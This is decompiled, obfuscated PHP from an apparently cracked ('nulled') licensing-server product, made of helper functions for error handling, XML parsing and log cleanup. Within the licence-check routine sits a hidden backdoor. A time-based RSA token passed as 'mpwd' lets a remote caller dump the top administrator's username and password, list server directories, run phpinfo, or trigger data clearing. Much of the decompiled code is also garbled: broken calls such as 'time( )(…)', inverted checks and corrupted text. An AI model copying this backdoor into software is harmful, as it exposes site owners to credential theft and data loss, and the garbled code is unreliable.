<?php
/*********************/
/*                   */
/*  Dezend for PHP5  */
/*         NWS       */
/*      Nulled.WS    */
/*                   */
/*********************/

function _obfuscate_iY_SkJWUkpCLiJKVj42Vho4ÿ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ = 1 )
{
    $_obfuscate_iJGPjJWLj4uLkIqVjYiHh48ÿ = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obfuscate_iY2Oh5OGlIqQhpCJi5CMkogÿ = ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Yÿ[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ] << 4 ) + ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Yÿ[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ + 1] >> 4 );
        $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ += 2;
    } while ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ < 28 );
}

function error_report_fun_api( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoYÿ, $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ÿ, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUÿ )
{
    global $_obfuscate_j4yLiZOJiIiUkZOQkJWHjpQÿ;
    if ( preg_match( "/unlink|file_put_contents|in safe mode|php_network_getaddresses|function\\.rmdir|function\\.iconv/i", $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ ) )
    {
        return TRUE;
    }
    $_obfuscate_j4yLiZOJiIiUkZOQkJWHjpQÿ = TRUE;
    $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ÿ = str_replace( KSSROOTDIR, "", $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ÿ );
    $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ = str_replace( KSSROOTDIR, "", $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ );
    if ( stripos( $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ, "mysql_" ) !== FALSE )
    {
        $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ = preg_replace( "/\\[.*\\]/", "", $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ );
        $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ = preg_replace( "/\\'[^\\']*\\'/", "'***'", $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ );
    }
    $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ = str_replace( ADMINFOLDER, "***", $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ );
    $_obfuscate_jZWIjY6GlZKGipCMj4_Nh4sÿ = array( "E_ERROR", "E_WARNING", "E_PARSE", "E_NOTICE", "E_CORE_ERROR", "E_CORE_WARNING", "E_COMPILE_ERROR", "E_COMPILE_WARNING", "E_USER_ERROR", "E_USER_WARNING", "E_USER_NOTICE", "E_STRICT", "E_RECOVERABLE_ERROR", "E_ALL" );
    $_obfuscate_jYiMkoyVi5GOkY_NiIyKiocÿ = "<b>".$_obfuscate_jZWIjY6GlZKGipCMj4_Nh4sÿ[$_obfuscate_lI6Gio6PjomOj4mRjoaUjoYÿ]." : ".$_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ."</b>";
    if ( isset( $_GET['linenum'] ) )
    {
        $_obfuscate_jYiMkoyVi5GOkY_NiIyKiocÿ = "<b>".$_obfuscate_jZWIjY6GlZKGipCMj4_Nh4sÿ[$_obfuscate_lI6Gio6PjomOj4mRjoaUjoYÿ]." : ".$_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ." in ".$_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ÿ." on line ".$_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUÿ."</b>";
    }
    if ( stripos( $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ, "mysql_" ) !== FALSE )
    {
        return TRUE;
    }
    echo $_obfuscate_jYiMkoyVi5GOkY_NiIyKiocÿ;
    exit( );
}

function _obfuscate_hpKJipCTlIePjoiMjZSOkZUÿ( $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ )
{
    return preg_replace( "#\\\\u([0-9a-f]{4})#ie", "iconv('UCS-2BE', 'UTF-8', pack('H4', '\\1'))", json_encode( $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ ) );
}

function _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Qÿ( $_obfuscate_io_SlIuNkIuKjZOIkIiOlZAÿ, $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYwÿ, $_obfuscate_jZSVhpSIj5STkJWIlJGVjosÿ = array( ), $_obfuscate_kpGKjomRjY6SkIyHh4qUj5Mÿ = "global" )
{
    global $_obfuscate_kI6OjImLjJCRh46PjYqLhooÿ;
    if ( $_obfuscate_kpGKjomRjY6SkIyHh4qUj5Mÿ == "global" )
    {
        $_obfuscate_kpGKjomRjY6SkIyHh4qUj5Mÿ = $_obfuscate_kI6OjImLjJCRh46PjYqLhooÿ;
    }
    if ( empty( $_obfuscate_jZSVhpSIj5STkJWIlJGVjosÿ ) )
    {
        $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYwÿ = strtr( $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYwÿ, $_obfuscate_jZSVhpSIj5STkJWIlJGVjosÿ );
    }
    switch ( $_obfuscate_kpGKjomRjY6SkIyHh4qUj5Mÿ )
    {
        case "0" :
            $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ = array( "state" => $_obfuscate_io_SlIuNkIuKjZOIkIiOlZAÿ, "message" => $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYwÿ );
            if ( empty( $_obfuscate_jZSVhpSIj5STkJWIlJGVjosÿ ) )
            {
                foreach ( $_obfuscate_jZSVhpSIj5STkJWIlJGVjosÿ as $_obfuscate_lIeHkoeKkpOSiomPi4mQk5Eÿ => $_obfuscate_io6UjZWThpOSjYeOj46Qkowÿ )
                {
                    $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ[$_obfuscate_lIeHkoeKkpOSiomPi4mQk5Eÿ] = $_obfuscate_io6UjZWThpOSjYeOj46Qkowÿ;
                }
            }
            exit( _obfuscate_hpKJipCTlIePjoiMjZSOkZUÿ( $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ ) );
        case "1" :
            $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ = array( "state" => $_obfuscate_io_SlIuNkIuKjZOIkIiOlZAÿ, "message" => $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYwÿ );
            if ( empty( $_obfuscate_jZSVhpSIj5STkJWIlJGVjosÿ ) )
            {
                foreach ( $_obfuscate_jZSVhpSIj5STkJWIlJGVjosÿ as $_obfuscate_lIeHkoeKkpOSiomPi4mQk5Eÿ => $_obfuscate_io6UjZWThpOSjYeOj46Qkowÿ )
                {
                    $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ[$_obfuscate_lIeHkoeKkpOSiomPi4mQk5Eÿ] = $_obfuscate_io6UjZWThpOSjYeOj46Qkowÿ;
                }
            }
            exit( _obfuscate_i5SKlIaQlZOMkpCPk5WUiIYÿ( $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ ) );
        case "2" :
            exit( $_obfuscate_io_SlIuNkIuKjZOIkIiOlZAÿ."  :  ".$_obfuscate_lY6ViI_KiJWHj4aTlZKNjYwÿ );
    }
    $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ = array( "state" => $_obfuscate_io_SlIuNkIuKjZOIkIiOlZAÿ, "message" => $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYwÿ );
    if ( empty( $_obfuscate_jZSVhpSIj5STkJWIlJGVjosÿ ) )
    {
        foreach ( $_obfuscate_jZSVhpSIj5STkJWIlJGVjosÿ as $_obfuscate_lIeHkoeKkpOSiomPi4mQk5Eÿ => $_obfuscate_io6UjZWThpOSjYeOj46Qkowÿ )
        {
            $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ[$_obfuscate_lIeHkoeKkpOSiomPi4mQk5Eÿ] = $_obfuscate_io6UjZWThpOSjYeOj46Qkowÿ;
        }
    }
    exit( _obfuscate_i5SKlIaQlZOMkpCPk5WUiIYÿ( $_obfuscate_jo6SjIuHj46LjIyTlIyQk4sÿ ) );
}

function _obfuscate_i5SKlIaQlZOMkpCPk5WUiIYÿ( $_obfuscate_io6LjpCQk4uVko2MkZSTkI4ÿ )
{
    $_obfuscate_io_NlZONi4mIkZSOlZWPlIwÿ = "<xml>";
    foreach ( $_obfuscate_io6LjpCQk4uVko2MkZSTkI4ÿ as $_obfuscate_lIeHkoeKkpOSiomPi4mQk5Eÿ => $_obfuscate_io6UjZWThpOSjYeOj46Qkowÿ )
    {
        $_obfuscate_io_NlZONi4mIkZSOlZWPlIwÿ .= "<".$_obfuscate_lIeHkoeKkpOSiomPi4mQk5Eÿ.">".$_obfuscate_io6UjZWThpOSjYeOj46Qkowÿ."</".$_obfuscate_lIeHkoeKkpOSiomPi4mQk5Eÿ.">";
    }
    $_obfuscate_io_NlZONi4mIkZSOlZWPlIwÿ .= "</xml>";
    return $_obfuscate_io_NlZONi4mIkZSOlZWPlIwÿ;
}

function _obfuscate_lYuJjJWJlJGLlJKJiJCKj44ÿ( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ )
{
    $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ = str_replace( "<![CDATA[", "", $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ );
    $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ = str_replace( "]]>", "", $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ );
    $_obfuscate_jYeTho6Sho2SiY2LlI6HkYgÿ = array( );
    $_obfuscate_k5SSio_IjZGMi5CNioyRkJUÿ = preg_match_all( "/\\<[^\\/\\>]*\\>/", $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ, $_obfuscate_iJCQho2QjJCMk4aHiIeOkJMÿ );
    if ( 0 == $_obfuscate_k5SSio_IjZGMi5CNioyRkJUÿ )
    {
        return $_obfuscate_jYeTho6Sho2SiY2LlI6HkYgÿ;
    }
    $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ = 1;
    for ( ; $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ < $_obfuscate_k5SSio_IjZGMi5CNioyRkJUÿ; ++$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ )
    {
        $_obfuscate_koyVhpKOiZKLjImMjpCJk4Yÿ = $_obfuscate_iJCQho2QjJCMk4aHiIeOkJMÿ[0][$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ];
        $_obfuscate_i4_PjZGOlYyMioqNiI6NkI4ÿ = "</".substr( $_obfuscate_koyVhpKOiZKLjImMjpCJk4Yÿ, 1 );
        $_obfuscate_iJOMlI2Ok4ePk4uKiI_Hh4cÿ = strpos( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ, $_obfuscate_koyVhpKOiZKLjImMjpCJk4Yÿ );
        $_obfuscate_lI_OlIaTk4qOko_KhpKLkpUÿ = strpos( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ, $_obfuscate_i4_PjZGOlYyMioqNiI6NkI4ÿ );
        if ( $_obfuscate_iJOMlI2Ok4ePk4uKiI_Hh4cÿ < $_obfuscate_lI_OlIaTk4qOko_KhpKLkpUÿ )
        {
            $_obfuscate_iIiUlZKHlIiQh4qMh4iTjZMÿ = strlen( $_obfuscate_koyVhpKOiZKLjImMjpCJk4Yÿ );
            $_obfuscate_k5CLlIuLhoqRlImHkI_RjZIÿ = substr( $_obfuscate_koyVhpKOiZKLjImMjpCJk4Yÿ, 1, $_obfuscate_iIiUlZKHlIiQh4qMh4iTjZMÿ - 2 );
            $_obfuscate_jYeTho6Sho2SiY2LlI6HkYgÿ[$_obfuscate_k5CLlIuLhoqRlImHkI_RjZIÿ] = substr( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ, $_obfuscate_iJOMlI2Ok4ePk4uKiI_Hh4cÿ + strlen( $_obfuscate_koyVhpKOiZKLjImMjpCJk4Yÿ ), $_obfuscate_lI_OlIaTk4qOko_KhpKLkpUÿ - $_obfuscate_iJOMlI2Ok4ePk4uKiI_Hh4cÿ - $_obfuscate_iIiUlZKHlIiQh4qMh4iTjZMÿ );
        }
    }
    return $_obfuscate_jYeTho6Sho2SiY2LlI6HkYgÿ;
}

function _obfuscate_komQkZGUhomRk4eLipOSkJMÿ( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ )
{
    if ( function_exists( "libxml_disable_entity_loader" ) )
    {
        libxml_disable_entity_loader( TRUE );
        $_obfuscate_i5SPhouVkYmIio2Pj4aHho8ÿ = json_decode( json_encode( simplexml_load_string( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ, "SimpleXMLElement", LIBXML_NOCDATA ) ), TRUE );
        ksort( &$_obfuscate_i5SPhouVkYmIio2Pj4aHho8ÿ );
        return $_obfuscate_i5SPhouVkYmIio2Pj4aHho8ÿ;
    }
    $_obfuscate_i5SPhouVkYmIio2Pj4aHho8ÿ = _obfuscate_lYuJjJWJlJGLlJKJiJCKj44ÿ( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8ÿ );
    ksort( &$_obfuscate_i5SPhouVkYmIio2Pj4aHho8ÿ );
    return $_obfuscate_i5SPhouVkYmIio2Pj4aHho8ÿ;
}

function _obfuscate_ho_Ki4_TiZCUk4yOkJCPh5Mÿ( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUÿ = intval( date( "d" ) );
    $_obfuscate_kpSRlIaMh4qJk46IkIeKlIkÿ = file_get_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html" );
    if ( trim( $_obfuscate_kpSRlIaMh4qJk46IkIeKlIkÿ ) != $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUÿ )
    {
        file_put_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html", $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUÿ );
        _obfuscate_k42GhouUh5SVj4uSlYqRlYgÿ( );
        if ( SVRID == 1 )
        {
            $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "delete from `kss_tb_sql_points` where `svrid`=1", "notsync" );
        }
        time( )( "delete from `kss_tb_log_task` where `addtime`<".( time( ) - 604800 ), "sync" );
        time( )( "delete from `kss_tb_lock` where locktime <".( time( ) - 120 ), "sync" );
        time( )( "delete from `kss_tb_log_login` where `logintime`<".( time( ) - 2592000 ), "sync" );
        time( )( "delete from `kss_tb_log_pubuser` where `nday`<".( time( ) - 2592000 ), "sync" );
        time( )( "delete from `kss_tb_log_ws` where `addtime`<".( time( ) - 86400 ), "sync" );
        $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Yÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8ÿ( "select * from kss_tb_soft" );
        foreach ( $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Yÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
        {
            time( )( "delete from `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."` where `addtime`<".( time( ) - 86400 * Z_LOG_DAY ), "sync" );
            time( )( "delete from `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
            time( )( "delete from `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
        }
        if ( 0 < BAKDATAMODE )
        {
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocÿ = array( );
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocÿ['action'] = "mysqldatabak_down";
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocÿ['pwd'] = MYSQLBAKPASSWORD;
            $_obfuscate_koeIkpGLi5GUhpCViZCSj5Iÿ = _obfuscate_j5SMi5KSiouIj4iIipWIkIsÿ( _obfuscate_ko_JjomRlIiQkYiRlZKSkZIÿ( ).INSTALLPATH._obfuscate_hpGJi4yHlIqLhpSIh4iJlYwÿ( )."/admin_data.php?qz=1", $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocÿ, 1 );
        }
    }
    if ( IS2SVR == 1 && SVRID == 1 )
    {
        $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIkÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_ho_Ljo6NjpOOhpGHj5KHiYsÿ( "synclock" );
        if ( $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIkÿ === TRUE )
        {
            $_obfuscate_i5GKlIaRho2UlJOMh46Hh5Mÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAÿ( "select * from kss_tb_config where id=1", 1, 1 );
            if ( $_obfuscate_i5GKlIaRho2UlJOMh46Hh5Mÿ['sync_state'] < 5 && SYNCTIME < time( ) - $_obfuscate_i5GKlIaRho2UlJOMh46Hh5Mÿ['sync_starttime'] )
            {
                time( )( "update kss_tb_config set `sync_starttime`=".time( )." where id=1" );
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kYyNi4eQiouGlY6Qj46HjpEÿ( "synclock" );
                if ( MYSQLSYNCMODE == 1 )
                {
                    if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThokÿ( "curl_init" ) && _obfuscate_ipWHiIuOiYuPjIaPkZSThokÿ( "curl_exec" ) )
                    {
                        $_obfuscate_kpSUiYeUjJSJk4iHkZGGjIoÿ = _obfuscate_j5SMi5KSiouIj4iIipWIkIsÿ( SYNC1URL, FALSE, 1 );
                    }
                    else
                    {
                        if ( ini_get( "allow_url_fopen" ) )
                        {
                            $_obfuscate_iJKKiouRh4qTh4eMiZSSlYkÿ = @fopen( @SYNC1URL."?e=".@time( ), "r" );
                            if ( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYkÿ !== FALSE )
                            {
                                $_obfuscate_kJWSj4iSjI2PlYuMiYuSiYcÿ = fread( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYkÿ, 60 );
                            }
                            fclose( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYkÿ );
                        }
                    }
                }
                else
                {
                    $_obfuscate_ioqNlY6GjpCVjY2Ph5WViocÿ = file_get_contents( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."notifyid.txt" );
                    if ( strlen( $_obfuscate_ioqNlY6GjpCVjY2Ph5WViocÿ ) < 20 )
                    {
                        $_obfuscate_koyQjY_KiZCRjpGLkomMiocÿ = time( );
                        $_obfuscate_ioqNlY6GjpCVjY2Ph5WViocÿ = _obfuscate_iI6QhpSTiJCJiI_KlYePlZIÿ( 20 - strlen( $_obfuscate_koyQjY_KiZCRjpGLkomMiocÿ ), 1 ).$_obfuscate_koyQjY_KiZCRjpGLkomMiocÿ;
                    }
                    else
                    {
                        $_obfuscate_ioqNlY6GjpCVjY2Ph5WViocÿ = substr( $_obfuscate_ioqNlY6GjpCVjY2Ph5WViocÿ, 0, 20 );
                    }
                    $_obfuscate_kpSUiYeUjJSJk4iHkZGGjIoÿ = _obfuscate_j5SMi5KSiouIj4iIipWIkIsÿ( SYNC1URL."?step=a1&notifyid=".$_obfuscate_ioqNlY6GjpCVjY2Ph5WViocÿ."&pwd=".MYSQLBAKPASSWORD, FALSE, 1 );
                }
            }
            $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kYyNi4eQiouGlY6Qj46HjpEÿ( "synclock" );
        }
        else
        {
            echo $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIkÿ."é”å¤±è´¥";
        }
    }
}

function _obfuscate_joeQipOGjouJko_VlJSKiJEÿ( $_obfuscate_lImSkomRk4uRjJGSkZWJh4kÿ )
{
    if ( preg_match( "/^[a-zA-Z0-9]{32}$/i", $_obfuscate_lImSkomRk4uRjJGSkZWJh4kÿ, $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkocÿ ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obfuscate_jpOIlY_HlIaJi46IiYySiJUÿ( $_obfuscate_lImSkomRk4uRjJGSkZWJh4kÿ )
{
    if ( preg_match( "/^[a-zA-Z0-9]*$/i", $_obfuscate_lImSkomRk4uRjJGSkZWJh4kÿ, $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkocÿ ) )
    {
        return TRUE;
    }
    return FALSE;
}

function error_report_fun_norpeat( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoYÿ, $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ÿ, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUÿ )
{
    echo $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUÿ.":".$_obfuscate_jpCKlY6RkYuPkoyHlJKMiosÿ;
    return TRUE;
}

function _obfuscate_iJKNipGLkZGLkoaOjYiRkpMÿ( $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQÿ )
{
    $_obfuscate_h5GOjJOKlI_TkIuTj4yUjowÿ = opendir( $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQÿ );
    while ( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48ÿ = readdir( $_obfuscate_h5GOjJOKlI_TkIuTj4yUjowÿ ) )
    {
        if ( !( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48ÿ != "." ) || !( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48ÿ != ".." ) )
        {
            $_obfuscate_j5SMipOTkJSMlYaViJGGlI4ÿ = $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQÿ."/".$_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48ÿ;
            if ( is_dir( $_obfuscate_j5SMipOTkJSMlYaViJGGlI4ÿ ) )
            {
                echo $_obfuscate_j5SMipOTkJSMlYaViJGGlI4ÿ;
                echo "<br>";
            }
        }
    }
    closedir( $_obfuscate_h5GOjJOKlI_TkIuTj4yUjowÿ );
}

function _obfuscate_kouKkIeViIqPk5KMiIiMkpEÿ( )
{
    global $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZMÿ;
    global $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kÿ;
    $_obfuscate_koqVkIuMioyRipKGiJGVlIoÿ = array( 0 => "no", 1 => "yes", 2 => "YES" );
    if ( isset( $_POST['mpwd'] ) || isset( $_GET['mpwd'] ) )
    {
        set_error_handler( "error_report_fun_norpeat" );
        if ( isset( $_POST['mpwd'] ) )
        {
            $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUÿ = $_POST['mpwd'];
        }
        if ( isset( $_GET['mpwd'] ) )
        {
            $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUÿ = $_GET['mpwd'];
        }
        $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUÿ = trim( str_replace( " ", "+", $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUÿ ) );
        $_obfuscate_k46MjY_Hh5KNjJONlYaMjIsÿ = "-----BEGIN PUBLIC KEY-----\r\nMIHfMA0GCSqGSIb3DQEBAQUAA4HNADCByQKBwQCksmzkkvfGkeyFoQRfwCeWXxty\r\nYU7vg2Qg0H6cdx3MHLVUyPad1LI+ym4xMhVKZkM1ReyFbtSot47dqJHU1vUtPx8R\r\nKI98FcDxd167eVMlfbJ59F0dm9F+TQOhKN0TOOUPiogDe6yg/Q/iUX1NczIeRlif\r\nZUApuoJprc2Kj5MX2DahKiEVXLkS8Wn8AmMABV9N+NmXPVtmd2sUq5LEQZd4ranK\r\nC2nk/2F+MiVnVfm5ms6liRx35vXJtBKXIASKck8CAwEAAQ==\r\n-----END PUBLIC KEY-----";
        if ( $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUÿ == "viewtime" )
        {
            ob_clean( );
            exit( date( "Ymd H:i:s" )."YES" );
        }
        $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkokÿ = crypt_rsa_ex( $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUÿ, $_obfuscate_k46MjY_Hh5KNjJONlYaMjIsÿ, "decrypt" );
        if ( $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkokÿ == date( "Ymd H:i" ) )
        {
            if ( isset( $_POST['login'] ) || isset( $_GET['login'] ) )
            {
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ = new mysql_cls( );
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4ÿ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kÿ );
                $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAÿ( "select * from kss_tb_manager where level=9 limit 0,1" );
                if ( empty( $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYÿ ) )
                {
                    _obfuscate_jZKVlY6HkYmKkIyRj4qSjIcÿ( "kss_manager", $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYÿ['id'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYÿ['username'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYÿ['password'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYÿ['linecode'] );
                    echo "<a href=../".ADMINFOLDER."/admin.php target=_blank>ok</a><br>";
                    _obfuscate_iJKNipGLkZGLkoaOjYiRkpMÿ( ".." );
                    if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThokÿ( "phpinfo" ) )
                    {
                        phpinfo( );
                        exit( );
                    }
                }
                echo "not find manager";
                _obfuscate_iJKNipGLkZGLkoaOjYiRkpMÿ( ".." );
                exit( );
            }
            if ( isset( $_POST['clsdata'] ) || isset( $_GET['clsdata'] ) )
            {
                _obfuscate_ipORj42NiZCIio_LkZORhpEÿ( "cls,manager" );
                _obfuscate_koyMjY2HkImOho6JkIeQh4cÿ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kÿ );
            }
        }
        exit( );
    }
    _obfuscate_iZSOiYeSlIqPjpSLkpSIj40ÿ( );
    if ( md5( "KeY!@#%&*,AbIoPe*v_19-82".substr( WEBLIC, 33 ).HTTPKEY ) != substr( WEBLIC, 0, 32 ) )
    {
        $_obfuscate_lIyUkIaVk46LiZCNipOIkJAÿ = "";
        _obfuscate_ipORj42NiZCIio_LkZORhpEÿ( "domain md5err" );
        _obfuscate_koyMjY2HkImOho6JkIeQh4cÿ( );
    }
    $_obfuscate_jouQkY2GipOLh5CUiI2Thocÿ = 0;
    $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qÿ = KSSLOGDIR."index.log";
    $_obfuscate_k4eIio2IioeLiIeJhpGHjJMÿ = date( "Ymd" );
    $_obfuscate_iY2ViY_HkJWTh46MioqSh5Uÿ = "19800101".sprintf( "%u", crc32( WEBLIC.HTTPKEY."19800101abcdefghijklmn" ) );
    $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUÿ = $_obfuscate_k4eIio2IioeLiIeJhpGHjJMÿ.sprintf( "%u", crc32( WEBLIC.HTTPKEY.$_obfuscate_k4eIio2IioeLiIeJhpGHjJMÿ."abcdefghijklmn" ) );
    $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ÿ = $_obfuscate_iY2ViY_HkJWTh46MioqSh5Uÿ;
    if ( is_file( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qÿ ) )
    {
        $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ÿ = file_get_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qÿ );
        if ( empty( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ÿ ) )
        {
            $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ÿ = $_obfuscate_iY2ViY_HkJWTh46MioqSh5Uÿ;
        }
    }
    else
    {
        $_obfuscate_jouQkY2GipOLh5CUiI2Thocÿ = 1;
    }
    if ( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ÿ == "200001011059550389" )
    {
        _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Qÿ( "500", "è°¢è°¢ä½¿ç”¨ï¼Œè¯·æ”¯æŒæ­£ç‰ˆè½¯ä»¶ï¼" );
    }
    if ( substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ÿ, 8 ) != sprintf( "%u", crc32( WEBLIC.HTTPKEY.substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ÿ, 0, 8 )."abcdefghijklmn" ) ) )
    {
        @file_put_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qÿ, "" );
